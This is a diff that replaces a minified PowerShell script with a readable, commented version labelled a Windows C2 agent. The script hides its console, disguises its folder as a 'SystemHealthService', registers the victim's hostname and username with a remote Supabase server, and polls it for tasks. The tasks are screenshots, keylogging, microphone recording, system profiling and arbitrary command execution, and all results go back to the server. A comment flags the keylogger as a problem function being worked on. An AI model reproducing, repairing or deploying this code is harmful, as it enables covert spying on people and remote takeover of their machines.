@@ -1,16 +1,405 @@
-$ErrorActionPreference="SilentlyContinue";$ProgressPreference="SilentlyContinue"
-try{Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);';[N.W]::ShowWindow([N.W]::GetConsoleWindow(),0)}catch{}
-$p="C:\ProgramData\SystemHealthService";$kb="$p\kb.tmp";while(!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)){Start-Sleep 5};Start-Sleep 5
-$cfg=Get-Content "$p\config.json" -Raw|ConvertFrom-Json;$idf="$p\device_id.txt"
-if(Test-Path $idf){$did=(Get-Content $idf -Raw).Trim()}else{$did=[guid]::NewGuid().ToString();$did|Out-File $idf -NoNewline;(Get-Item $idf).Attributes="Hidden"}
-$dn=-join((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})
-$h=@{"apikey"=$cfg.supabase_key;"Authorization"="Bearer $($cfg.supabase_key)";"Content-Type"="application/json";"Prefer"="return=minimal"}
-function I{param($e,$m="GET",$b=$null);$uri="$($cfg.supabase_url)/rest/v1/$e";try{if($b){Invoke-RestMethod -Uri $uri -Method $m -Headers $h -Body ($b|ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30}else{Invoke-RestMethod -Uri $uri -Method $m -Headers $h -TimeoutSec 30}}catch{$null}}
-$r=@{device_id=$did;device_name=$dn;hostname=$env:COMPUTERNAME;username=$env:USERNAME;os_info=(Get-CimInstance Win32_OperatingSystem).Caption};I -e "devices" -m "POST" -b $r
-function D{try{Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);$m=New-Object System.IO.MemoryStream;$b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png);$x=[Convert]::ToBase64String($m.ToArray());$g.Dispose();$b.Dispose();$m.Dispose();@{data_type="display";file_data=$x}}catch{@{data_type="display";data="Failed"}}}
-function K{param($dur=60);try{Add-Type -AssemblyName System.Windows.Forms;Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KS -Namespace U -EA SilentlyContinue;""|Out-File $kb -NoNewline;$end=(Get-Date).AddSeconds($dur);while((Get-Date) -lt $end){for($v=8;$v -le 190;$v++){if([U.KS]::GetAsyncKeyState($v) -eq -32767){$k=[System.Windows.Forms.Keys]$v;Add-Content $kb "$k " -NoNewline}};Start-Sleep -Milliseconds 50};$kd=Get-Content $kb -Raw -EA SilentlyContinue;Remove-Item $kb -Force -EA SilentlyContinue;if($kd){@{data_type="input";data=$kd}}else{@{data_type="input";data="[No keystrokes recorded]"}}}catch{@{data_type="input";data="Error: $_"}}}
-function S{try{$os=Get-CimInstance Win32_OperatingSystem;$c=Get-CimInstance Win32_ComputerSystem;@{data_type="sysinfo";data=(@{hostname=$env:COMPUTERNAME;username=$env:USERNAME;os=$os.Caption;os_version=$os.Version;manufacturer=$c.Manufacturer;model=$c.Model;memory_gb=[math]::Round($c.TotalPhysicalMemory/1GB,2)}|ConvertTo-Json -Compress)}}catch{$null}}
-function V{param($dur=10);try{$af="$p\rec.wav";Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AR{[DllImport("winmm.dll",EntryPoint="mciSendStringA")]public static extern int mciSendString(string c,string b,int s,IntPtr h);}' -Language CSharp -EA SilentlyContinue;[AR]::mciSendString("open new Type waveaudio Alias rs","",0,[IntPtr]::Zero);[AR]::mciSendString("set rs bitspersample 16","",0,[IntPtr]::Zero);[AR]::mciSendString("set rs samplespersec 22050","",0,[IntPtr]::Zero);[AR]::mciSendString("set rs channels 1","",0,[IntPtr]::Zero);[AR]::mciSendString("record rs","",0,[IntPtr]::Zero);Start-Sleep $dur;[AR]::mciSendString("stop rs","",0,[IntPtr]::Zero);[AR]::mciSendString("save rs `"$af`"","",0,[IntPtr]::Zero);[AR]::mciSendString("close rs","",0,[IntPtr]::Zero);if(Test-Path $af){$ab=[System.IO.File]::ReadAllBytes($af);$x=[Convert]::ToBase64String($ab);Remove-Item $af -Force -EA SilentlyContinue;@{data_type="audio";file_data=$x}}else{@{data_type="audio";data="Failed"}}}catch{@{data_type="audio";data="$_"}}}
-function C{param($cmd);try{$pi=New-Object System.Diagnostics.ProcessStartInfo;$pi.FileName="cmd.exe";$pi.Arguments="/c $cmd";$pi.RedirectStandardOutput=$true;$pi.RedirectStandardError=$true;$pi.UseShellExecute=$false;$pi.CreateNoWindow=$true;$pr=New-Object System.Diagnostics.Process;$pr.StartInfo=$pi;$pr.Start()|Out-Null;$o=$pr.StandardOutput.ReadToEnd();$e=$pr.StandardError.ReadToEnd();$pr.WaitForExit(30000);@{data_type="cmd_result";data=(@{command=$cmd;output=$o;error=$e;exit_code=$pr.ExitCode}|ConvertTo-Json -Compress)}}catch{@{data_type="cmd_result";data=(@{command=$cmd;error="$_"}|ConvertTo-Json -Compress)}}}
-$si=if($cfg.sync_interval){$cfg.sync_interval}else{10};$ri=if($cfg.retry_interval){$cfg.retry_interval}else{10}
-while($true){try{I -e "devices?device_id=eq.$did" -m "PATCH" -b @{last_sync=(Get-Date -Format "o")}|Out-Null;$ts=I -e "tasks?device_id=eq.$did&status=eq.pending&select=id,task_type,task_params";if($ts){if($ts -isnot [array]){$ts=@($ts)};foreach($t in $ts){I -e "tasks?id=eq.$($t.id)" -m "PATCH" -b @{status="processing"}|Out-Null;$tl=$null;switch($t.task_type){"display_capture"{$tl=D}"input_monitor"{$dur=60;if($t.task_params -and $t.task_params.duration){$dur=[int]$t.task_params.duration};$tl=K -dur $dur}"system_info"{$tl=S}"voice_capture"{$dur=10;if($t.task_params -and $t.task_params.duration){$dur=[int]$t.task_params.duration};$tl=V -dur $dur}"cmd_exec"{$cmd="";if($t.task_params -and $t.task_params.command){$cmd=$t.task_params.command};if($cmd){$tl=C -cmd $cmd}else{$tl=@{data_type="cmd_result";data="No command"}}}};if($tl){$bd=@{device_id=$did;data_type=$tl.data_type};if($tl.file_data){$bd.file_data=$tl.file_data};if($tl.data){$bd.data=$tl.data};I -e "telemetry" -m "POST" -b $bd|Out-Null;I -e "tasks?id=eq.$($t.id)" -m "PATCH" -b @{status="complete";completed_at=(Get-Date -Format "o")}|Out-Null}}};Start-Sleep $si}catch{Start-Sleep $ri}}
+# ================================
+# WINDOWS C2 AGENT - FORMATTED
+# ================================
+
+# Suppress errors and progress bars
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+
+# Hide console window
+try {
+    Add-Type -Name Window -Namespace Native -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
+    [Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
+} catch {}
+
+# ================================
+# CONFIGURATION
+# ================================
+
+$basePath = "C:\ProgramData\SystemHealthService"
+$keylogFile = "$basePath\kb.tmp"
+
+# Wait for internet connection
+while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
+    Start-Sleep 5
+}
+Start-Sleep 5
+
+# Load config
+$config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
+$deviceIdFile = "$basePath\device_id.txt"
+
+# Get or create device ID
+if (Test-Path $deviceIdFile) {
+    $deviceId = (Get-Content $deviceIdFile -Raw).Trim()
+} else {
+    $deviceId = [guid]::NewGuid().ToString()
+    $deviceId | Out-File $deviceIdFile -NoNewline
+    (Get-Item $deviceIdFile).Attributes = "Hidden"
+}
+
+# Generate random device name (8 chars)
+$deviceName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+
+# ================================
+# API HELPER FUNCTION
+# ================================
+
+$headers = @{
+    "apikey" = $config.supabase_key
+    "Authorization" = "Bearer $($config.supabase_key)"
+    "Content-Type" = "application/json"
+    "Prefer" = "return=minimal"
+}
+
+function Invoke-API {
+    param(
+        $endpoint,
+        $method = "GET",
+        $body = $null
+    )
+    
+    $uri = "$($config.supabase_url)/rest/v1/$endpoint"
+    
+    try {
+        if ($body) {
+            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30
+        } else {
+            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -TimeoutSec 30
+        }
+    } catch {
+        $null
+    }
+}
+
+# ================================
+# REGISTER DEVICE
+# ================================
+
+$registrationData = @{
+    device_id = $deviceId
+    device_name = $deviceName
+    hostname = $env:COMPUTERNAME
+    username = $env:USERNAME
+    os_info = (Get-CimInstance Win32_OperatingSystem).Caption
+}
+
+Invoke-API -endpoint "devices" -method "POST" -body $registrationData
+
+# ================================
+# TASK FUNCTIONS
+# ================================
+
+# Screenshot Capture
+function Capture-Screenshot {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+        
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        
+        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+        
+        $memoryStream = New-Object System.IO.MemoryStream
+        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+        $base64 = [Convert]::ToBase64String($memoryStream.ToArray())
+        
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        $memoryStream.Dispose()
+        
+        return @{
+            data_type = "display"
+            file_data = $base64
+        }
+    } catch {
+        return @{
+            data_type = "display"
+            data = "Failed"
+        }
+    }
+}
+
+# Keylogger Function - THIS IS THE PROBLEM FUNCTION
+function Capture-Keystrokes {
+    param($duration = 60)
+    
+    try {
+        # Load required assemblies
+        Add-Type -AssemblyName System.Windows.Forms
+        
+        # Import GetAsyncKeyState API
+        Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -EA SilentlyContinue
+        
+        # Clear keylog file
+        "" | Out-File $keylogFile -NoNewline
+        
+        # Calculate end time
+        $endTime = (Get-Date).AddSeconds($duration)
+        
+        # Monitor keystrokes until duration expires
+        while ((Get-Date) -lt $endTime) {
+            # Check virtual key codes 8-190
+            for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
+                # Check if key is pressed (-32767 means just pressed)
+                if ([User.KeyState]::GetAsyncKeyState($virtualKey) -eq -32767) {
+                    $keyName = [System.Windows.Forms.Keys]$virtualKey
+                    Add-Content $keylogFile "$keyName " -NoNewline
+                }
+            }
+            
+            # Sleep 50ms between checks to reduce CPU usage
+            Start-Sleep -Milliseconds 50
+        }
+        
+        # Read captured keystrokes
+        $keystrokeData = Get-Content $keylogFile -Raw -EA SilentlyContinue
+        
+        # Clean up temp file
+        Remove-Item $keylogFile -Force -EA SilentlyContinue
+        
+        # Return data
+        if ($keystrokeData) {
+            return @{
+                data_type = "input"
+                data = $keystrokeData
+            }
+        } else {
+            return @{
+                data_type = "input"
+                data = "[No keystrokes recorded]"
+            }
+        }
+    } catch {
+        return @{
+            data_type = "input"
+            data = "Error: $_"
+        }
+    }
+}
+
+# System Info
+function Get-SystemInfo {
+    try {
+        $os = Get-CimInstance Win32_OperatingSystem
+        $computer = Get-CimInstance Win32_ComputerSystem
+        
+        $info = @{
+            hostname = $env:COMPUTERNAME
+            username = $env:USERNAME
+            os = $os.Caption
+            os_version = $os.Version
+            manufacturer = $computer.Manufacturer
+            model = $computer.Model
+            memory_gb = [math]::Round($computer.TotalPhysicalMemory / 1GB, 2)
+        }
+        
+        return @{
+            data_type = "sysinfo"
+            data = ($info | ConvertTo-Json -Compress)
+        }
+    } catch {
+        $null
+    }
+}
+
+# Audio Recording
+function Record-Audio {
+    param($duration = 10)
+    
+    try {
+        $audioFile = "$basePath\rec.wav"
+        
+        # Define MCI commands
+        Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AudioRecorder{[DllImport("winmm.dll",EntryPoint="mciSendStringA")]public static extern int mciSendString(string command,string buffer,int bufferSize,IntPtr hwndCallback);}' -Language CSharp -EA SilentlyContinue
+        
+        # Start recording
+        [AudioRecorder]::mciSendString("open new Type waveaudio Alias recorder", "", 0, [IntPtr]::Zero)
+        [AudioRecorder]::mciSendString("set recorder bitspersample 16", "", 0, [IntPtr]::Zero)
+        [AudioRecorder]::mciSendString("set recorder samplespersec 22050", "", 0, [IntPtr]::Zero)
+        [AudioRecorder]::mciSendString("set recorder channels 1", "", 0, [IntPtr]::Zero)
+        [AudioRecorder]::mciSendString("record recorder", "", 0, [IntPtr]::Zero)
+        
+        # Wait for duration
+        Start-Sleep $duration
+        
+        # Stop and save
+        [AudioRecorder]::mciSendString("stop recorder", "", 0, [IntPtr]::Zero)
+        [AudioRecorder]::mciSendString("save recorder `"$audioFile`"", "", 0, [IntPtr]::Zero)
+        [AudioRecorder]::mciSendString("close recorder", "", 0, [IntPtr]::Zero)
+        
+        # Read and encode audio file
+        if (Test-Path $audioFile) {
+            $audioBytes = [System.IO.File]::ReadAllBytes($audioFile)
+            $base64 = [Convert]::ToBase64String($audioBytes)
+            Remove-Item $audioFile -Force -EA SilentlyContinue
+            
+            return @{
+                data_type = "audio"
+                file_data = $base64
+            }
+        } else {
+            return @{
+                data_type = "audio"
+                data = "Failed"
+            }
+        }
+    } catch {
+        return @{
+            data_type = "audio"
+            data = "$_"
+        }
+    }
+}
+
+# Command Execution
+function Execute-Command {
+    param($cmd)
+    
+    try {
+        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processInfo.FileName = "cmd.exe"
+        $processInfo.Arguments = "/c $cmd"
+        $processInfo.RedirectStandardOutput = $true
+        $processInfo.RedirectStandardError = $true
+        $processInfo.UseShellExecute = $false
+        $processInfo.CreateNoWindow = $true
+        
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo = $processInfo
+        $process.Start() | Out-Null
+        
+        $output = $process.StandardOutput.ReadToEnd()
+        $errorOutput = $process.StandardError.ReadToEnd()
+        $process.WaitForExit(30000)
+        
+        $result = @{
+            command = $cmd
+            output = $output
+            error = $errorOutput
+            exit_code = $process.ExitCode
+        }
+        
+        return @{
+            data_type = "cmd_result"
+            data = ($result | ConvertTo-Json -Compress)
+        }
+    } catch {
+        $result = @{
+            command = $cmd
+            error = "$_"
+        }
+        
+        return @{
+            data_type = "cmd_result"
+            data = ($result | ConvertTo-Json -Compress)
+        }
+    }
+}
+
+# ================================
+# MAIN LOOP
+# ================================
+
+# Set sync intervals (default 10 seconds)
+$syncInterval = if ($config.sync_interval) { $config.sync_interval } else { 10 }
+$retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 10 }
+
+while ($true) {
+    try {
+        # Update last sync time
+        Invoke-API -endpoint "devices?device_id=eq.$deviceId" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") } | Out-Null
+        
+        # Get pending tasks
+        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&select=id,task_type,task_params"
+        
+        if ($tasks) {
+            # Ensure tasks is an array
+            if ($tasks -isnot [array]) {
+                $tasks = @($tasks)
+            }
+            
+            # Process each task
+            foreach ($task in $tasks) {
+                # Mark task as processing
+                Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{ status = "processing" } | Out-Null
+                
+                $taskResult = $null
+                
+                # Execute based on task type
+                switch ($task.task_type) {
+                    "display_capture" {
+                        $taskResult = Capture-Screenshot
+                    }
+                    
+                    "input_monitor" {
+                        $duration = 60
+                        if ($task.task_params -and $task.task_params.duration) {
+                            $duration = [int]$task.task_params.duration
+                        }
+                        $taskResult = Capture-Keystrokes -duration $duration
+                    }
+                    
+                    "system_info" {
+                        $taskResult = Get-SystemInfo
+                    }
+                    
+                    "voice_capture" {
+                        $duration = 10
+                        if ($task.task_params -and $task.task_params.duration) {
+                            $duration = [int]$task.task_params.duration
+                        }
+                        $taskResult = Record-Audio -duration $duration
+                    }
+                    
+                    "cmd_exec" {
+                        $command = ""
+                        if ($task.task_params -and $task.task_params.command) {
+                            $command = $task.task_params.command
+                        }
+                        
+                        if ($command) {
+                            $taskResult = Execute-Command -cmd $command
+                        } else {
+                            $taskResult = @{
+                                data_type = "cmd_result"
+                                data = "No command"
+                            }
+                        }
+                    }
+                }
+                
+                # Save results to telemetry
+                if ($taskResult) {
+                    $telemetryData = @{
+                        device_id = $deviceId
+                        data_type = $taskResult.data_type
+                    }
+                    
+                    if ($taskResult.file_data) {
+                        $telemetryData.file_data = $taskResult.file_data
+                    }
+                    
+                    if ($taskResult.data) {
+                        $telemetryData.data = $taskResult.data
+                    }
+                    
+                    # Insert into telemetry table
+                    Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
+                    
+                    # Mark task as complete
+                    Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
+                        status = "complete"
+                        completed_at = (Get-Date -Format "o")
+                    } | Out-Null
+                }
+            }
+        }
+        
+        Start-Sleep $syncInterval
+        
+    } catch {
+        Start-Sleep $retryInterval
+    }
+}
